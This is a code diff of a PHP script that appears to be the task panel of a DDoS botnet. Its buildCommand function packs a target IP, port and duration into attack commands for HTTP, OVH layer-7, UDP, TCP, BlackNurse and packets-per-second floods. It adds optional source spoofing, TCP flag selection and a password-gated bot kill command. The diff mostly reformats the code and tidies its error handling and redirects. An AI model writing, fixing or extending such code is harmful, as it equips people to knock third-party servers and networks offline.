@@ -46,56 +46,55 @@ if (isset($_POST["submit"])) {
 
 function buildCommand($seltask, $postData) {
 
-  if($postData["time"] > 7200)
-    $postData["time"] = 7200;
+    if ($postData["time"] > 7200)
+        $postData["time"] = 7200;
 
-  $commonData = $postData["ip"] . "|" . $postData["port"] . "|" . $postData["time"];
+    $commonData = $postData["ip"] . "|" . $postData["port"] . "|" . $postData["time"];
 
-  switch ($seltask) {
-	case "HTTP":
-	  if (isset($_POST["path"]) && !empty($_POST["path"]) && isset($_POST["method"]) && !empty($_POST["method"]) && isset($_POST["power"]) && !empty($_POST["power"])) {
-		  return $commonData . "|" . $_POST["path"] . "|" . $_POST["method"] . "|" . $_POST["power"];
-	  break;
-	case "OVHL7":
-	  if (isset($_POST["power"]) && !empty($_POST["power"])) {
-		  return $commonData . "|" . $_POST["power"];
-	  break;
-    case "HTTPSOCKET":
-      if (isset($postData["power"]) && !empty($postData["power"]))
-          return $commonData . "|" . $postData["power"];
-      break;
-    case "UDP":
-      if (isset($postData["packetsize"]) && !empty($postData["packetsize"]))
-          return $commonData . "|" . $postData["packetsize"] . "|1" . (isset($postData["spoofit"]) ? "|" . rand(1, 31) : "");
-      break;
-    case "BLACKNURSE":
-      return $postData["ip"] . "|" . $postData["time"];
-    case "UDPPPS":
-      if (isset($postData["ppspacketsize"]) && !empty($postData["ppspacketsize"]))
-        return $commonData . "|". $postData["ppspacketsize"];
-      break;
-    case "TCP":
-      if (isset($postData["packetsize"]) && !empty($postData["packetsize"]) &&  isset($postData["checkboxes"])) {
-        $flags = implode(", ", $postData["checkboxes"]);
-        if ($flags === "syn, rst, fin, ack, psh")
-            $flags = "all";
-        return $commonData . "|" . $flags . "|" . $postData["packetsize"] . "|1" . (isset($postData["spoofit"]) ? "|" . rand(1, 31) : "");
-      }
-      break;
-    case "KILL":
-      if (isset($postData["killpassword"]) && !empty($postData["killpassword"]))
-          return "|" . $postData["killpassword"];
-      break;
-    default:
-        return $commonData;
-  }
-  echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
-  echo '<script>
-    setTimeout(function() {
-        window.location.href = "./tasks.php";
-    }, 3000);
-  </script>';
-  return null;
+    switch ($seltask) {
+        case "HTTP":
+            if (isset($_POST["path"]) && !empty($_POST["path"]) && isset($_POST["method"]) && !empty($_POST["method"]) && isset($_POST["power"]) && !empty($_POST["power"])) {
+                return $commonData . "|" . $_POST["path"] . "|" . $_POST["method"] . "|" . $_POST["power"];
+            }
+            break;
+        case "OVHL7":
+            if (isset($_POST["power"]) && !empty($_POST["power"])) {
+                return $commonData . "|" . $_POST["power"];
+            }
+            break;
+        case "HTTPSOCKET":
+            if (isset($postData["power"]) && !empty($postData["power"]))
+                return $commonData . "|" . $postData["power"];
+            break;
+        case "UDP":
+            if (isset($postData["packetsize"]) && !empty($postData["packetsize"]))
+                return $commonData . "|" . $postData["packetsize"] . "|1" . (isset($postData["spoofit"]) ? "|" . rand(1, 31) : "");
+            break;
+        case "BLACKNURSE":
+            return $postData["ip"] . "|" . $postData["time"];
+        case "UDPPPS":
+            if (isset($postData["ppspacketsize"]) && !empty($postData["ppspacketsize"]))
+                return $commonData . "|" . $postData["ppspacketsize"];
+            break;
+        case "TCP":
+            if (isset($postData["packetsize"]) && !empty($postData["packetsize"]) &&  isset($postData["checkboxes"])) {
+                $flags = implode(", ", $postData["checkboxes"]);
+                if ($flags === "syn, rst, fin, ack, psh")
+                    $flags = "all";
+                return $commonData . "|" . $flags . "|" . $postData["packetsize"] . "|1" . (isset($postData["spoofit"]) ? "|" . rand(1, 31) : "");
+            }
+            break;
+        case "KILL":
+            if (isset($postData["killpassword"]) && !empty($postData["killpassword"]))
+                return "|" . $postData["killpassword"];
+            break;
+        default:
+            echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
+            header('Refresh: 3; URL=./tasks.php');
+            return null;
+    }
+
+    return $commonData;
 }
 
 function insertTasksAndOutputs($dbConnection, $username, $action, $hostnames, $command) {
@@ -120,13 +119,8 @@ function insertTasksAndOutputs($dbConnection, $username, $action, $hostnames, $c
 }
 
 function displaySuccessMessage() {
-  echo "<br><div class='alert alert-success'>Successfully tasked command. Redirecting back to command.php in 3 seconds. Do not refresh the page.</div>";
-  header('Refresh: 3; URL=./tasks.php');
-  echo '<script>
-      setTimeout(function() {
-          window.location.href = "./tasks.php";
-      }, 3000);
-  </script>';
+    echo "<br><div class='alert alert-success'>Successfully tasked command. Redirecting back to command.php in 3 seconds. Do not refresh the page.</div>";
+    header('Refresh: 3; URL=./tasks.php');
 }
 
 ob_end_flush();
